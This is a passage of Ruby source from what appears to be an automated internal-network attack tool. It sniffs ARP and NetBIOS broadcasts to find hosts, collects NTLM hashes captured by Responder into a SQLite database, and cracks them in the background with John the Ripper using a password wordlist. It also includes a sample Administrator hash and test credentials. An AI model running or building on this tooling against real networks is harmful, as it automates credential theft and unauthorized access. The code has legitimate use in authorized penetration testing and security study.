  broadcastIP =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.255'
  puts "[*] Interface IP: "+local_ip
  #puts broadcastIP
  udp_pkt = PacketFu::UDPPacket.new
  udp_pkt.eth_dst = "\xff\xff\xff\xff\xff\xff"
  udp_pkt.udp_src=137
  udp_pkt.udp_dst=137

  udp_pkt.ip_saddr=local_ip
  udp_pkt.ip_daddr=broadcastIP
  nbns_tranID = "\x80\x0a"
  nbns_flags  = "\x01\x10"
  nbns_questions = "\x00\x01"
  nbns_answers = "\x00\x00"
  nbns_authority = "\x00\x00"
  nbns_additional = "\x00\x00"
  nbns_queriesType="\x00\x20"
  nbns_queriesClass="\x00\x01"

  encoded = ''
  encodedHex = "\x20"
  hostName.scan(/./).each do |i|
   encoded<<charLookup[i.upcase()]
   c=charLookup[i.upcase()]
   encodedHex<<c
  end
  encodedHex<<"\x43\x41\x43\x41\x41\x41\x00"
  udp_pkt.payload=nbns_tranID+nbns_flags+nbns_questions+nbns_answers+nbns_authority+nbns_additional<<encodedHex<<nbns_queriesType<<nbns_queriesClass
  udp_pkt.recalc
  udp_pkt.to_f('/mnt/hgfs/tmp/udp.pcap')
  puts "[*] Sent Netbios Name Query for: "+hostName
  udp_pkt.to_w("eth0")
end

def sniff(iface)
  puts "[*] Listening to: "+iface
  #puts "[*] Looking for Packets Matching Destination IP: "+dstIP
  charLookup = {"EB"=>"A", "EC"=>"B", "ED"=>"C", "EE"=>"D", "EF"=>"E", "EG"=>"F", "EH"=>"G", "EI"=>"H", "EJ"=>"I", "EK"=>"J", "EL"=>"K", "EM"=>"L", "EN"=>"M", "EO"=>"N", "EP"=>"O", "FA"=>"P", "FB"=>"Q", "FC"=>"R", "FD"=>"S", "FE"=>"T", "FF"=>"U", "FG"=>"V", "FH"=>"W", "FI"=>"X", "FJ"=>"Y", "FK"=>"Z","DA"=>"0", "DB"=>"1", "DC"=>"2", "DD"=>"3", "DE"=>"4", "DF"=>"5", "DG"=>"6", "DH"=>"7", "DI"=>"8", "DJ"=>"9", "CA"=>" ", "CB"=>"!",  "CE"=>"$", "CF"=>"%", "CG"=>"&", "CH"=>"'", "CI"=>"(", "CJ"=>")", "CK"=>"*", "CL"=>"+", "CM"=>",", "CN"=>"-", "CO"=>".", "DN"=>"=", "DK"=>":", "DL"=>";", "EA"=>"@", "FO"=>"^", "FP"=>"_", "HL"=>"{", "HN"=>"}", "HO"=>"~"}

  #Get Broadcast IP Address
  ipAddr = local_ip.split('.').map{ |octet| octet.to_i} 
  broadcastIP =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.255'

  cap = Capture.new(:iface => iface, :start => true)
  cap.stream.each do |p|
    pkt = Packet.parse p
    if pkt.eth_daddr==Mac.addr and pkt.proto.last=='ARP' 
	if pkt.arp_opcode==2
		if !$hostList.include? pkt.arp_saddr_ip
			puts "[!] Found Host: "+pkt.arp_saddr_ip+" (" +pkt.arp_saddr_mac+")"
			
			if findMac(pkt.eth_saddr)==false			
				$hostList<<(pkt.arp_saddr_ip)
				if not $blackList.include? pkt.arp_saddr_ip
					$scanList<<(pkt.arp_saddr_ip).strip
				end
			else
				$hostList<<(pkt.arp_saddr_ip).strip
			end
		end
	end
    end
    #Listens and picks up ARP packets
    if pkt.is_arp?
      if pkt.eth_daddr==Mac.addr
      	 if pkt.arp_opcode==2
		
	    ipAddr = pkt.arp_saddr_ip
	    macAddr = pkt.arp_saddr_mac
	    updateHost(macAddr,ipAddr)

         end
      end
    end
    #Listens to NetBIOS broadcast packets for new hosts
    #if pkt.is_ip?
    if pkt.is_udp?
      next if pkt.ip_saddr == Utils.ifconfig(iface)[:ip_saddr]
      packet_info = [pkt.ip_saddr, pkt.ip_daddr, pkt.size, pkt.proto.last]
      finalStr = ''
      if (pkt.ip_daddr==broadcastIP) and  pkt.proto.last=='UDP' and pkt.udp_sport==137
	     tranID = pkt.hexify(pkt.payload[0..1])
             nbnsq_flags = pkt.hexify(pkt.payload[2..3])
	     nbnsq_flags = nbnsq_flags.gsub(" ","")
	     nbnsq_flags = nbnsq_flags.gsub(".","")
	     nbnsq_flags = nbnsq_flags.gsub("(","")
	     nbnsq_flags = nbnsq_flags.gsub(")","")
	     #puts "Packet found"
             tranID1 = tranID.split(" ")
	     pkt.payload().split("").each do |i|
              	charDict = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
              	if charDict.include? i
              		finalStr += i
              	end
	     end
             nbnsq_list = chunk(finalStr,2)
	     if tranID1[0]=="80" and tranID1[1]=="00"
	        if nbnsq_flags.to_s=="2910"
	    	        decoded = ''
		        process=0
               	 	while process!=1
				for i in nbnsq_list
					if !charLookup[i].nil?
						decoded<<charLookup[i]
					else
						process=1
					end			
				end
			end
			puts "[!] Received NetBIOS Broadcast - (Name: "+decoded+") (IP: "+pkt.ip_saddr+")"
			ipAddr = "%-15s" %packet_info
			hostName = decoded
			updateHostNBNS(hostName,pkt.ip_saddr)
                end

	    end   
	 end
      end

   end
end

def crackHash()
	loop{
		print Color.green,Color.bold,'[*] Looking for hashes to crack ...',Color.clear+"\n"
		
		#crackJohn = "/pentest/john/john "+hashFile+" --wordlist="/Volumes/My Passport/Password_Lists/crackstation.txt"
		hashType=[]
		hashType<<"ntlmv1"
		hashType<<"ntlmv2"
		hashToCrack = []
		 #db.execute("CREATE TABLE passwords (id INTEGER PRIMARY KEY, ipHost VARCHAR(255), type VARCHAR(100), hash VARCHAR(100), username VARCHAR(100), plainText VARCHAR(100), crackStatus VARCHAR(1), runJohn VARCHAR(1)) ");


		for hash in hashType
			begin
		   	 	db = SQLite3::Database.open "database.db"
				#stmt = db.prepare "SELECT hash from passwords WHERE crackStatus=?"
				stmt = db.prepare "SELECT hash from passwords WHERE crackStatus=? and type=?"
				stmt.bind_param 1, 0
				stmt.bind_param 2, hash
				rs = stmt.execute
				while (row = rs.next) do
					hashToCrack<< row[0]
				end
			rescue SQLite3::Exception => e 
	   	 		puts "Exception occured"
	   	 		puts e
	   	 	ensure
				stmt.close if stmt
	    		db.close if db
			end
		end
		if hashToCrack.length>0
			print Color.green,Color.bold,'[*] Found uncracked hashes in database...',Color.clear+"\n"
			puts hashToCrack
		else
			print Color.green,Color.bold,'[*] No ',hash,' hash to crack yet ...',Color.clear+"\n"
		end		

		begin
			file = File.open("/tmp/hash", "w")
			for hash in hashToCrack
				file.write(hash+"\n")
			end 
		rescue IOError => e
			puts e
		ensure
			file.close unless file == nil
		end
		print Color.green,Color.bold,'[*] Cracking hashes in background...',Color.clear+"\n"
		cmd = "screen -list | grep jtrscreen"
		results = run_cmd(cmd)
		if results.length<1
			cmd = "screen -dmS jtrscreen"
			run_cmd(cmd)
			cmd = "screen -S jtrscreen -X stuff '/bin/bash --login\n/usr/sbin/john  --rules:KoreLogic --wordlist=/mnt/hgfs/passwords/500-worst-passwords.txt /tmp/hash\n'"
			run_cmd(cmd)
		else
			cmd = "killall john"
			results = run_cmd(cmd)
			
			cmd = "ps aux | grep john | grep -v grep | awk '{print $2}'"
			results = run_cmd(cmd)
			if results.length<1
				cmd = "screen -S jtrscreen -X stuff '/bin/bash --login\n/usr/sbin/john --rules:KoreLogic  --wordlist=/mnt/hgfs/passwords/500-worst-passwords.txt /tmp/hash\n'"
				results = run_cmd(cmd)
				if $verbose==true
					puts results
				end
			end
		end
		sleep 180
	}
end	

def watchResponderDir()
	print Color.green,Color.bold,'[*] Looking for new hashes in Responder folder...',Color.clear+"\n"
	responderPath = "/pentest/Responder/"
	fileList = Dir["/pentest/Responder/*ntlm*"]
	hashList = []
	for filename in fileList
		f = File.open(filename, "r")
		f.each_line do |line|
		 	hashList <<line
		end
		f.close	
	end
	puts "[*] Inserting hashes found in Responder folder into database."
	for hash in hashList
		begin
		   	db1 = SQLite3::Database.open "database.db"
			stmt1 = db1.prepare "insert into passwords (ipHost,type,hash,crackStatus,runJohn) VALUES (?,?,?,0,0)"
			stmt1.bind_param 1, "127.0.0.1"
			stmt1.bind_param 2, "ntlmv2"
			stmt1.bind_param 3, hash
			rs1 = stmt1.execute
		rescue SQLite3::Exception => e 
			puts "Exception occured"
			puts e
		ensure
			stmt1.close if stmt1
	    	db1.close if db1
		end
	#Dir.chdir(responderPath)
	#fileList = Dir["*ntlm.txt"]
	#for x in fileList
	#	puts x
	end
end

def startApps()
end

def sampleData()
	#Test to insert record
	##To be removed during production
	#puts "[*] Inserting test uncracked hash into database."
	#begin
	#   	db1 = SQLite3::Database.open "database.db"
	#	stmt1 = db1.prepare "insert into passwords (ipHost,type,hash,crackStatus,runJohn) VALUES (?,?,?,0,0)"
	#	stmt1.bind_param 1, "127.0.0.1"
	#	stmt1.bind_param 2, "ntlmv2"
	#	stmt1.bind_param 3, "Administrator:500:cd9f3af449b29ec3aad3b435b51404ee:3a792fcf68710cb2edc6a5251cbadcd7:::"
	#	rs1 = stmt1.execute
	#rescue SQLite3::Exception => e 
	#	puts "Exception occured"
	#	puts e
	#ensure
	#	stmt1.close if stmt1
    #	db1.close if db1
	#end

	puts "[*] Inserting test credentials into database."
	begin
		db1 = SQLite3::Database.open "database.db"
		stmt1 = db1.prepare "insert into passwords (username,plainText,ipHost,crackStatus) VALUES (?,?,?,?)"
		stmt1.bind_param 1, "test"
		stmt1.bind_param 2, "test"
		stmt1.bind_param 3, "127.0.0.1"
		stmt1.bind_param 4, 1
		rs1 = stmt1.execute
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    ensure
		stmt1.close if stmt1
    	db1.close if db1
	end
	begin
	   	db1 = SQLite3::Database.open "database.db"
		stmt1 = db1.prepare "insert into hosts (ipAddr,gotAccess,runScan) VALUES (?,?,1)"
		stmt1.bind_param 1, "192.168.112.130"
		stmt1.bind_param 2, 1
		#stmt1.bind_param 2, 0
		rs1 = stmt1.execute
	rescue SQLite3::Exception => e 
			puts "Exception occured"
			puts e
	ensure
		stmt1.close if stmt1
		db1.close if db1
	end	
	##To be removed during production
end
#msfHandler()
#watchResponderDir()
#watchPwdDir()
#system('rm -rf scan_1*')

options = {}
opt_parser = OptionParser.new do |opt|
  opt.banner = "Usage: opt_parser [OPTIONS]"
  opt.separator  "Options"
  opt.on("-v","--verbose","verbose mode") do
    options[:verbose] = true
  end
  opt.on("-h","--help","help") do
    puts opt_parser
    exit
  end
end

opt_parser.parse!
if options[:verbose]==true
	$verbose=true
end
system('rm -rf results.txt')
system('rm -rf database.db')
sleep(1)
createDatabase()
sampleData()
setup()
threadList=[]
iface = "eth0"
threadList<<Thread.new{startApps()}
threadList<<Thread.new{sniff(iface)}
threadList<<Thread.new{findHosts()}
threadList<<Thread.new{checkNewPasswords()}
threadList<<Thread.new{runScan()}
threadList<<Thread.new{watchResponderDir()}
threadList<<Thread.new{crackHash()}
threadList.each {|x| x.join}